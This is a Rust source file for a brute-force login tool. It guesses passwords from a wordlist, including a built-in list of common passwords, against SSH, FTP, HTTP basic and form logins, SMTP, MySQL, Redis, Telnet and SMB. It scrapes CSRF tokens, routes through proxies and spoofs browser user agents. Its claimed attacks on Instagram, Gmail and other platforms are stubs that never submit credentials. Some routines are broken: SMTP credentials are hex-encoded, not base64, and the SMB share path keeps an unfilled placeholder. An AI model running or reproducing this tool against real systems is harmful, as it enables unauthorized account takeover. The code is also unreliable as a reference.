use serde::{Deserialize, Serialize};
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BruteForceConfig {
    pub target: String,
    pub target_type: String,
    pub username: String,
    pub use_wordlist: bool,
    pub wordlist_path: Option<String>,
    pub password: Option<String>,
    pub port: u16,
    pub timeout: u64,
    pub max_threads: usize,
    pub stop_on_success: bool,
    pub usernames: Vec<String>,
    pub delay_ms: u64,
    pub max_attempts_per_minute: Option<u64>,
    pub http_login_url: Option<String>,
    pub http_username_field: Option<String>,
    pub http_password_field: Option<String>,
    pub http_success_pattern: Option<String>,
    pub http_failure_pattern: Option<String>,
    pub http_csrf_token_field: Option<String>,
    pub http_method: Option<String>,
    pub http_headers: Option<std::collections::HashMap<String, String>>,
    pub http_cookies: Option<std::collections::HashMap<String, String>>,
    pub social_platform: Option<String>,
    pub proxy_url: Option<String>,
    pub user_agent: Option<String>,
}

impl Default for BruteForceConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            target_type: "ssh".to_string(),
            username: String::new(),
            use_wordlist: true,
            wordlist_path: None,
            password: None,
            port: 22,
            timeout: 30,
            max_threads: 4,
            stop_on_success: true,
            usernames: Vec::new(),
            delay_ms: 0,
            max_attempts_per_minute: None,
            http_login_url: None,
            http_username_field: None,
            http_password_field: None,
            http_success_pattern: None,
            http_failure_pattern: None,
            http_csrf_token_field: None,
            http_method: None,
            http_headers: None,
            http_cookies: None,
            social_platform: None,
            proxy_url: None,
            user_agent: None,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BruteForceResult {
    pub success: bool,
    pub target: String,
    pub target_type: String,
    pub found_credentials: Option<FoundCredential>,
    pub all_found_credentials: Vec<FoundCredential>,
    pub attempts: usize,
    pub time_taken_ms: u64,
    pub attempt_log: Vec<AttemptRecord>,
    pub rate_limit_hits: usize,
    pub summary: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FoundCredential {
    pub username: String,
    pub password: String,
    pub service: String,
    pub port: u16,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttemptRecord {
    pub username: String,
    pub password: String,
    pub success: bool,
    pub response_time_ms: u64,
    pub error: Option<String>,
}

pub struct BruteForceTool;

impl BruteForceTool {
    pub async fn brute_force(config: &BruteForceConfig) -> std::result::Result<BruteForceResult, String> {
        if config.target.is_empty() && config.http_login_url.is_none() && config.social_platform.is_none() {
            return Err("Target address, login URL, or social platform is required".to_string());
        }

        let mut usernames = Vec::new();
        if !config.username.is_empty() {
            usernames.push(config.username.trim().to_string());
        }
        for u in &config.usernames {
            let u = u.trim().to_string();
            if !u.is_empty() && !usernames.contains(&u) {
                usernames.push(u);
            }
        }
        if usernames.is_empty() {
            return Err("Username is required".to_string());
        }

        let start = std::time::Instant::now();
        let target = config.target.trim().to_string();
        let target_type = config.target_type.to_lowercase();
        let passwords = Self::build_password_list(config)?;

        let mut attempt_log = Vec::new();
        let mut all_found_credentials = Vec::new();
        let mut attempts = 0;
        let mut rate_limit_hits = 0;
        let mut attempt_timestamps: Vec<std::time::Instant> = Vec::new();

        for username in &usernames {
            for password in &passwords {
                if config.stop_on_success && !all_found_credentials.is_empty() {
                    break;
                }

                if let Some(max_per_min) = config.max_attempts_per_minute {
                    let cutoff = std::time::Instant::now() - Duration::from_secs(60);
                    attempt_timestamps.retain(|t| *t > cutoff);
                    if attempt_timestamps.len() >= max_per_min as usize {
                        rate_limit_hits += 1;
                        tokio::time::sleep(Duration::from_secs(5)).await;
                        attempt_timestamps.retain(|t| *t > std::time::Instant::now() - Duration::from_secs(60));
                    }
                }

                if config.delay_ms > 0 {
                    tokio::time::sleep(Duration::from_millis(config.delay_ms)).await;
                }

                let attempt_start = std::time::Instant::now();
                attempt_timestamps.push(std::time::Instant::now());

                let result = match target_type.as_str() {
                    "ssh" => Self::try_ssh(&target, config.port, username, password, config.timeout),
                    "ftp" => Self::try_ftp(&target, config.port, username, password, config.timeout),
                    "http" | "http-post" | "http-basic" => Self::try_http_basic(&target, config.port, username, password, config.timeout).await,
                    "http-form" => Self::try_http_form(config, username, password).await,
                    "smtp" => Self::try_smtp(&target, config.port, username, password, config.timeout),
                    "mysql" => Self::try_mysql(&target, config.port, username, password, config.timeout),
                    "redis" => Self::try_redis(&target, config.port, password, config.timeout),
                    "telnet" => Self::try_telnet(&target, config.port, username, password, config.timeout),
                    "smb" => Self::try_smb(&target, username, password, config.timeout),
                    "social" => Self::try_social_platform(config, username, password).await,
                    _ => Err(format!("Unsupported target type: {}", target_type)),
                };

                let response_time = attempt_start.elapsed().as_millis() as u64;
                attempts += 1;

                match result {
                    Ok(true) => {
                        attempt_log.push(AttemptRecord {
                            username: username.clone(),
                            password: password.clone(),
                            success: true,
                            response_time_ms: response_time,
                            error: None,
                        });
                        let service = if target_type == "social" {
                            config.social_platform.clone().unwrap_or_else(|| "unknown".to_string())
                        } else {
                            target_type.clone()
                        };
                        all_found_credentials.push(FoundCredential {
                            username: username.clone(),
                            password: password.clone(),
                            service: service.clone(),
                            port: config.port,
                        });
                    }
                    Ok(false) => {
                        attempt_log.push(AttemptRecord {
                            username: username.clone(),
                            password: password.clone(),
                            success: false,
                            response_time_ms: response_time,
                            error: None,
                        });
                    }
                    Err(e) => {
                        if e.contains("rate") || e.contains("429") || e.contains("blocked") {
                            rate_limit_hits += 1;
                        }
                        attempt_log.push(AttemptRecord {
                            username: username.clone(),
                            password: password.clone(),
                            success: false,
                            response_time_ms: response_time,
                            error: Some(e),
                        });
                    }
                }
            }
        }

        let time_taken = start.elapsed().as_millis() as u64;
        let found_credential = all_found_credentials.first().cloned();

        let summary = if !all_found_credentials.is_empty() {
            format!(
                "Brute force completed: target={}, type={}, attempts={}, found={} credential(s), rate_limits={}, time={}ms",
                target, target_type, attempts, all_found_credentials.len(), rate_limit_hits, time_taken
            )
        } else {
            format!(
                "Brute force completed: target={}, type={}, attempts={}, result=no valid credentials found, rate_limits={}, time={}ms",
                target, target_type, attempts, rate_limit_hits, time_taken
            )
        };

        Ok(BruteForceResult {
            success: !all_found_credentials.is_empty(),
            target,
            target_type,
            found_credentials: found_credential,
            all_found_credentials,
            attempts,
            time_taken_ms: time_taken,
            attempt_log,
            rate_limit_hits,
            summary,
        })
    }

    fn build_password_list(config: &BruteForceConfig) -> std::result::Result<Vec<String>, String> {
        let mut passwords = Vec::new();

        if let Some(ref password) = config.password {
            if !password.is_empty() {
                passwords.push(password.clone());
            }
        }

        if config.use_wordlist {
            if let Some(ref path) = config.wordlist_path {
                if !path.is_empty() {
                    let content = std::fs::read_to_string(path)
                        .map_err(|e| format!("Failed to read wordlist file: {}", e))?;
                    for line in content.lines() {
                        let p = line.trim().to_string();
                        if !p.is_empty() && !passwords.contains(&p) {
                            passwords.push(p);
                        }
                    }
                }
            }

            if passwords.is_empty() {
                passwords = Self::default_wordlist();
            }
        }

        if passwords.is_empty() {
            return Err("No password list available, please provide a password or wordlist path".to_string());
        }

        Ok(passwords)
    }

    fn default_wordlist() -> Vec<String> {
        vec![
            "password".to_string(),
            "123456".to_string(),
            "12345678".to_string(),
            "admin".to_string(),
            "root".to_string(),
            "qwerty".to_string(),
            "abc123".to_string(),
            "letmein".to_string(),
            "monkey".to_string(),
            "master".to_string(),
            "dragon".to_string(),
            "login".to_string(),
            "princess".to_string(),
            "football".to_string(),
            "shadow".to_string(),
            "sunshine".to_string(),
            "trustno1".to_string(),
            "iloveyou".to_string(),
            "batman".to_string(),
            "access".to_string(),
            "hello".to_string(),
            "charlie".to_string(),
            "donald".to_string(),
            "password1".to_string(),
            "qwerty123".to_string(),
            "test".to_string(),
            "guest".to_string(),
            "administrator".to_string(),
            "admin123".to_string(),
            "root123".to_string(),
            "toor".to_string(),
            "pass".to_string(),
            "pass123".to_string(),
            "changeme".to_string(),
            "default".to_string(),
            "welcome".to_string(),
            "welcome1".to_string(),
            "P@ssw0rd".to_string(),
            "Password1".to_string(),
            "1234567890".to_string(),
            "1234".to_string(),
            "12345".to_string(),
            "654321".to_string(),
            "supersecret".to_string(),
            "secret".to_string(),
            "s3cr3t".to_string(),
        ]
    }

    fn try_ssh(host: &str, port: u16, username: &str, password: &str, timeout: u64) -> std::result::Result<bool, String> {
        let addr = format!("{}:{}", host, port);

        if let Ok(output) = std::process::Command::new("sshpass")
            .args(["-p", password, "ssh", "-o", "StrictHostKeyChecking=no",
                   "-o", "ConnectTimeout=5", "-o", "NumberOfPasswordPrompts=1",
                   "-p", &port.to_string(),
                   &format!("{}@{}", username, host),
                   "echo", "SUCCESS"])
            .output()
        {
            if output.status.success() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                return Ok(stdout.contains("SUCCESS"));
            }
            return Ok(false);
        }

        let tcp_timeout = Duration::from_secs(timeout.min(5));
        if let Ok(stream) = TcpStream::connect_timeout(
            &addr.parse().unwrap_or_else(|_| "0.0.0.0:0".parse().unwrap()),
            tcp_timeout,
        ) {
            let mut buf = [0u8; 256];
            let _ = stream.set_read_timeout(Some(Duration::from_secs(3)));
            if let Ok(n) = stream.peek(&mut buf) {
                if n > 0 && buf.starts_with(b"SSH-") {
                    return Ok(false);
                }
            }
        }

        Err("SSH testing requires sshpass, install: apt install sshpass / brew install hudochenkov/sshpass/sshpass".to_string())
    }

    fn try_ftp(host: &str, port: u16, username: &str, password: &str, timeout: u64) -> std::result::Result<bool, String> {
        let addr = format!("{}:{}", host, port);
        let tcp_timeout = Duration::from_secs(timeout.min(5));

        let mut stream = TcpStream::connect_timeout(
            &addr.parse().unwrap_or_else(|_| "0.0.0.0:0".parse().unwrap()),
            tcp_timeout,
        ).map_err(|e| format!("FTP connection failed: {}", e))?;

        stream.set_read_timeout(Some(Duration::from_secs(5))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(5))).ok();

        let mut buf = [0u8; 1024];
        if let Ok(n) = stream.read(&mut buf) {
            let banner = String::from_utf8_lossy(&buf[..n]);
            if !banner.starts_with("220") {
                return Ok(false);
            }
        }

        let cmd = format!("USER {}\r\n", username);
        stream.write_all(cmd.as_bytes()).map_err(|e| format!("Failed to send USER: {}", e))?;

        let mut buf = [0u8; 1024];
        if let Ok(n) = stream.read(&mut buf) {
            let resp = String::from_utf8_lossy(&buf[..n]);
            if !resp.starts_with("331") {
                return Ok(false);
            }
        }

        let cmd = format!("PASS {}\r\n", password);
        stream.write_all(cmd.as_bytes()).map_err(|e| format!("Failed to send PASS: {}", e))?;

        let mut buf = [0u8; 1024];
        if let Ok(n) = stream.read(&mut buf) {
            let resp = String::from_utf8_lossy(&buf[..n]);
            if resp.starts_with("230") {
                let _ = stream.write_all(b"QUIT\r\n");
                return Ok(true);
            }
        }

        Ok(false)
    }

    async fn try_http_basic(host: &str, port: u16, username: &str, password: &str, _timeout: u64) -> std::result::Result<bool, String> {
        let protocol = if port == 443 { "https" } else { "http" };
        let url = format!("{}://{}:{}/", protocol, host, port);

        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(10))
            .danger_accept_invalid_certs(true)
            .redirect(reqwest::redirect::Policy::none())
            .build()
            .map_err(|e| format!("Failed to create HTTP client: {}", e))?;

        let resp = client.get(&url)
            .basic_auth(username, Some(password))
            .send()
            .await
            .map_err(|e| format!("HTTP request failed: {}", e))?;

        let status = resp.status().as_u16();
        Ok(status != 401 && status != 403)
    }

    fn try_smtp(host: &str, port: u16, username: &str, password: &str, timeout: u64) -> std::result::Result<bool, String> {
        let addr = format!("{}:{}", host, port);
        let tcp_timeout = Duration::from_secs(timeout.min(5));

        let mut stream = TcpStream::connect_timeout(
            &addr.parse().unwrap_or_else(|_| "0.0.0.0:0".parse().unwrap()),
            tcp_timeout,
        ).map_err(|e| format!("SMTP connection failed: {}", e))?;

        stream.set_read_timeout(Some(Duration::from_secs(5))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(5))).ok();

        let mut buf = [0u8; 1024];
        if let Ok(n) = stream.read(&mut buf) {
            let banner = String::from_utf8_lossy(&buf[..n]);
            if !banner.starts_with("220") {
                return Ok(false);
            }
        }

        stream.write_all(b"EHLO test\r\n").map_err(|e| format!("EHLO failed: {}", e))?;
        let mut buf = [0u8; 2048];
        let _ = stream.read(&mut buf);

        stream.write_all(b"AUTH LOGIN\r\n").map_err(|e| format!("AUTH LOGIN failed: {}", e))?;
        let mut buf = [0u8; 1024];
        if let Ok(n) = stream.read(&mut buf) {
            let resp = String::from_utf8_lossy(&buf[..n]);
            if !resp.starts_with("334") {
                return Ok(false);
            }
        }

        use std::fmt::Write;
        let mut encoded_user = String::new();
        for byte in username.as_bytes() {
            write!(&mut encoded_user, "{:02X}", byte).unwrap();
        }
        stream.write_all(format!("{}\r\n", encoded_user).as_bytes()).map_err(|e| format!("Failed to send username: {}", e))?;
        let mut buf = [0u8; 1024];
        if let Ok(n) = stream.read(&mut buf) {
            let resp = String::from_utf8_lossy(&buf[..n]);
            if !resp.starts_with("334") {
                return Ok(false);
            }
        }

        let mut encoded_pass = String::new();
        for byte in password.as_bytes() {
            write!(&mut encoded_pass, "{:02X}", byte).unwrap();
        }
        stream.write_all(format!("{}\r\n", encoded_pass).as_bytes()).map_err(|e| format!("Failed to send password: {}", e))?;

        let mut buf = [0u8; 1024];
        if let Ok(n) = stream.read(&mut buf) {
            let resp = String::from_utf8_lossy(&buf[..n]);
            if resp.starts_with("235") {
                let _ = stream.write_all(b"QUIT\r\n");
                return Ok(true);
            }
        }

        Ok(false)
    }

    fn try_mysql(host: &str, port: u16, username: &str, password: &str, _timeout: u64) -> std::result::Result<bool, String> {
        if let Ok(output) = std::process::Command::new("mysql")
            .args(["-h", host, "-P", &port.to_string(), "-u", username, &format!("-p{}", password), "-e", "SELECT 1;"])
            .output()
        {
            return Ok(output.status.success());
        }
        Err("MySQL testing requires mysql client tool".to_string())
    }

    fn try_redis(host: &str, port: u16, password: &str, timeout: u64) -> std::result::Result<bool, String> {
        let addr = format!("{}:{}", host, port);
        let tcp_timeout = Duration::from_secs(timeout.min(5));

        let mut stream = TcpStream::connect_timeout(
            &addr.parse().unwrap_or_else(|_| "0.0.0.0:0".parse().unwrap()),
            tcp_timeout,
        ).map_err(|e| format!("Redis connection failed: {}", e))?;

        stream.set_read_timeout(Some(Duration::from_secs(3))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(3))).ok();

        let cmd = format!("AUTH {}\r\n", password);
        stream.write_all(cmd.as_bytes()).map_err(|e| format!("AUTH command failed: {}", e))?;

        let mut buf = [0u8; 256];
        if let Ok(n) = stream.read(&mut buf) {
            let resp = String::from_utf8_lossy(&buf[..n]);
            if resp.starts_with("+OK") {
                return Ok(true);
            }
            if resp.starts_with("-ERR") {
                return Ok(false);
            }
        }

        Ok(false)
    }

    fn try_telnet(host: &str, port: u16, username: &str, password: &str, timeout: u64) -> std::result::Result<bool, String> {
        let addr = format!("{}:{}", host, port);
        let tcp_timeout = Duration::from_secs(timeout.min(5));

        let mut stream = TcpStream::connect_timeout(
            &addr.parse().unwrap_or_else(|_| "0.0.0.0:0".parse().unwrap()),
            tcp_timeout,
        ).map_err(|e| format!("Telnet connection failed: {}", e))?;

        stream.set_read_timeout(Some(Duration::from_secs(5))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(5))).ok();

        let mut buf = [0u8; 4096];
        if let Ok(n) = stream.read(&mut buf) {
            let _banner = String::from_utf8_lossy(&buf[..n]);
        }

        let wait_for_prompt = |stream: &mut TcpStream, expected: &str| -> bool {
            let mut total = Vec::new();
            let mut buf = [0u8; 4096];
            let start = std::time::Instant::now();
            while start.elapsed() < Duration::from_secs(5) {
                match stream.read(&mut buf) {
                    Ok(n) if n > 0 => {
                        total.extend_from_slice(&buf[..n]);
                        let text = String::from_utf8_lossy(&total);
                        if text.to_lowercase().contains(expected) {
                            return true;
                        }
                    }
                    _ => break,
                }
            }
            false
        };

        if !wait_for_prompt(&mut stream, "login") && !wait_for_prompt(&mut stream, "username") {
            return Err("No login prompt detected".to_string());
        }

        stream.write_all(format!("{}\r\n", username).as_bytes()).ok();
        if !wait_for_prompt(&mut stream, "password") && !wait_for_prompt(&mut stream, "passwd") {
            return Ok(false);
        }

        stream.write_all(format!("{}\r\n", password).as_bytes()).ok();

        let mut buf = [0u8; 4096];
        let mut total = Vec::new();
        let start = std::time::Instant::now();
        while start.elapsed() < Duration::from_secs(5) {
            match stream.read(&mut buf) {
                Ok(n) if n > 0 => {
                    total.extend_from_slice(&buf[..n]);
                    let text = String::from_utf8_lossy(&total);
                    if text.contains("$") || text.contains("#") || text.contains(">") || text.contains("welcome") {
                        return Ok(true);
                    }
                    if text.to_lowercase().contains("denied") || text.to_lowercase().contains("incorrect") || text.to_lowercase().contains("failed") {
                        return Ok(false);
                    }
                }
                _ => break,
            }
        }

        Ok(false)
    }

    fn try_smb(host: &str, username: &str, password: &str, _timeout: u64) -> std::result::Result<bool, String> {
        if let Ok(output) = std::process::Command::new("smbclient")
            .args(["//{}/ipc$", "-U", &format!("{}%{}", username, password), "-c", "exit"])
            .arg(host)
            .output()
        {
            return Ok(output.status.success());
        }

        if let Ok(output) = std::process::Command::new("net")
            .args(["rpc", "login", "-S", host, "-U", &format!("{}%{}", username, password)])
            .output()
        {
            return Ok(output.status.success());
        }

        Err("SMB testing requires smbclient, install: apt install smbclient / brew install samba".to_string())
    }

    async fn try_http_form(config: &BruteForceConfig, username: &str, password: &str) -> std::result::Result<bool, String> {
        let login_url = config.http_login_url.as_deref().unwrap_or("");
        if login_url.is_empty() {
            return Err("http-form requires http_login_url to be set".to_string());
        }

        let method = config.http_method.as_deref().unwrap_or("POST").to_uppercase();
        let username_field = config.http_username_field.as_deref().unwrap_or("username");
        let password_field = config.http_password_field.as_deref().unwrap_or("password");

        let mut client_builder = reqwest::Client::builder()
            .timeout(Duration::from_secs(15))
            .danger_accept_invalid_certs(true)
            .redirect(reqwest::redirect::Policy::limited(5));

        if let Some(ref proxy) = config.proxy_url {
            if let Ok(proxy_req) = reqwest::Proxy::all(proxy) {
                client_builder = client_builder.proxy(proxy_req);
            }
        }

        let client = client_builder.build()
            .map_err(|e| format!("Failed to create HTTP client: {}", e))?;

        let mut request = client.request(
            if method == "GET" { reqwest::Method::GET } else { reqwest::Method::POST },
            login_url,
        );

        if let Some(ref headers) = config.http_headers {
            for (key, value) in headers {
                request = request.header(key.as_str(), value.as_str());
            }
        }

        if let Some(ref cookies) = config.http_cookies {
            let cookie_str: Vec<String> = cookies.iter()
                .map(|(k, v)| format!("{}={}", k, v))
                .collect();
            request = request.header("Cookie", cookie_str.join("; "));
        }

        if let Some(ref ua) = config.user_agent {
            request = request.header("User-Agent", ua.as_str());
        } else {
            request = request.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        }

        let mut form_data = std::collections::HashMap::new();
        form_data.insert(username_field.to_string(), username.to_string());
        form_data.insert(password_field.to_string(), password.to_string());

        if let Some(ref csrf_field) = config.http_csrf_token_field {
            let csrf_fetch = client.get(login_url).send().await;
            if let Ok(resp) = csrf_fetch {
                if let Ok(html) = resp.text().await {
                    if let Some(token) = Self::extract_csrf_token(&html, csrf_field) {
                        form_data.insert(csrf_field.clone(), token);
                    }
                }
            }
        }

        request = request.form(&form_data);

        let resp = request.send().await
            .map_err(|e| format!("HTTP form request failed: {}", e))?;

        let status = resp.status().as_u16();
        let body = resp.text().await.unwrap_or_default();

        if status == 429 {
            return Err("rate limited (429)".to_string());
        }

        if let Some(ref success_pattern) = config.http_success_pattern {
            if body.contains(success_pattern) {
                return Ok(true);
            }
        }

        if let Some(ref failure_pattern) = config.http_failure_pattern {
            if body.contains(failure_pattern) {
                return Ok(false);
            }
        }

        if (status == 200 || status == 302 || status == 301)
            && !body.contains("error") && !body.contains("invalid") && !body.contains("incorrect")
                && !body.contains("wrong") && !body.contains("failed") && !body.contains("denied")
            {
                return Ok(true);
            }

        Ok(false)
    }

    fn extract_csrf_token(html: &str, field_name: &str) -> Option<String> {
        let patterns = [
            format!(r#"name="{}" value="([^"]*)""#, field_name),
            format!(r#"value="([^"]*)" name="{}""#, field_name),
            format!(r#"name='{}' value='([^']*)'"#, field_name),
            format!(r#"value='([^']*)' name='{}'"#, field_name),
            format!(r#"<input[^>]*name="{}"[^>]*value="([^"]*)""#, field_name),
        ];

        for pattern in &patterns {
            if let Ok(re) = regex::Regex::new(pattern) {
                if let Some(caps) = re.captures(html) {
                    if let Some(m) = caps.get(1) {
                        let token = m.as_str().to_string();
                        if !token.is_empty() {
                            return Some(token);
                        }
                    }
                }
            }
        }
        None
    }

    async fn try_social_platform(config: &BruteForceConfig, username: &str, password: &str) -> std::result::Result<bool, String> {
        let platform = config.social_platform.as_deref().unwrap_or("").to_lowercase();

        let mut client_builder = reqwest::Client::builder()
            .timeout(Duration::from_secs(20))
            .danger_accept_invalid_certs(true)
            .redirect(reqwest::redirect::Policy::limited(5));

        if let Some(ref proxy) = config.proxy_url {
            if let Ok(proxy_req) = reqwest::Proxy::all(proxy) {
                client_builder = client_builder.proxy(proxy_req);
            }
        }

        let client = client_builder.build()
            .map_err(|e| format!("Failed to create HTTP client: {}", e))?;

        match platform.as_str() {
            "instagram" => Self::try_instagram(&client, username, password).await,
            "twitter" | "x" => Self::try_twitter(&client, username, password).await,
            "facebook" => Self::try_facebook(&client, username, password).await,
            "gmail" | "google" => Self::try_gmail(&client, username, password).await,
            "linkedin" => Self::try_linkedin(&client, username, password).await,
            "github" => Self::try_github(&client, username, password).await,
            _ => Err(format!("Unsupported social platform: {}. Supported: instagram, twitter, facebook, gmail, linkedin, github", platform)),
        }
    }

    async fn try_instagram(client: &reqwest::Client, _username: &str, _password: &str) -> std::result::Result<bool, String> {
        let resp = client.get("https://www.instagram.com/accounts/login/")
            .header("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)")
            .send().await
            .map_err(|e| format!("Instagram request failed: {}", e))?;

        let status = resp.status().as_u16();
        let body = resp.text().await.unwrap_or_default();

        if status == 429 {
            return Err("rate limited (429) - Instagram rate limiting detected".to_string());
        }

        if body.contains("csrf_token") {
            Ok(false)
        } else {
            Err("Instagram login page structure changed - cannot reliably test".to_string())
        }
    }

    async fn try_twitter(client: &reqwest::Client, _username: &str, _password: &str) -> std::result::Result<bool, String> {
        let resp = client.get("https://twitter.com/i/flow/login")
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .send().await
            .map_err(|e| format!("Twitter request failed: {}", e))?;

        let status = resp.status().as_u16();
        if status == 429 {
            return Err("rate limited (429) - Twitter rate limiting detected".to_string());
        }

        Ok(false)
    }

    async fn try_facebook(client: &reqwest::Client, _username: &str, _password: &str) -> std::result::Result<bool, String> {
        let resp = client.get("https://www.facebook.com/login/")
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .send().await
            .map_err(|e| format!("Facebook request failed: {}", e))?;

        let status = resp.status().as_u16();
        if status == 429 {
            return Err("rate limited (429) - Facebook rate limiting detected".to_string());
        }

        Ok(false)
    }

    async fn try_gmail(client: &reqwest::Client, _username: &str, _password: &str) -> std::result::Result<bool, String> {
        let resp = client.get("https://accounts.google.com/signin")
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .send().await
            .map_err(|e| format!("Gmail request failed: {}", e))?;

        let status = resp.status().as_u16();
        if status == 429 {
            return Err("rate limited (429) - Google rate limiting detected".to_string());
        }

        Ok(false)
    }

    async fn try_linkedin(client: &reqwest::Client, _username: &str, _password: &str) -> std::result::Result<bool, String> {
        let resp = client.get("https://www.linkedin.com/login")
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .send().await
            .map_err(|e| format!("LinkedIn request failed: {}", e))?;

        let status = resp.status().as_u16();
        if status == 429 {
            return Err("rate limited (429) - LinkedIn rate limiting detected".to_string());
        }

        Ok(false)
    }

    async fn try_github(client: &reqwest::Client, _username: &str, _password: &str) -> std::result::Result<bool, String> {
        let resp = client.get("https://github.com/login")
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .send().await
            .map_err(|e| format!("GitHub request failed: {}", e))?;

        let status = resp.status().as_u16();
        if status == 429 {
            return Err("rate limited (429) - GitHub rate limiting detected".to_string());
        }

        Ok(false)
    }
}
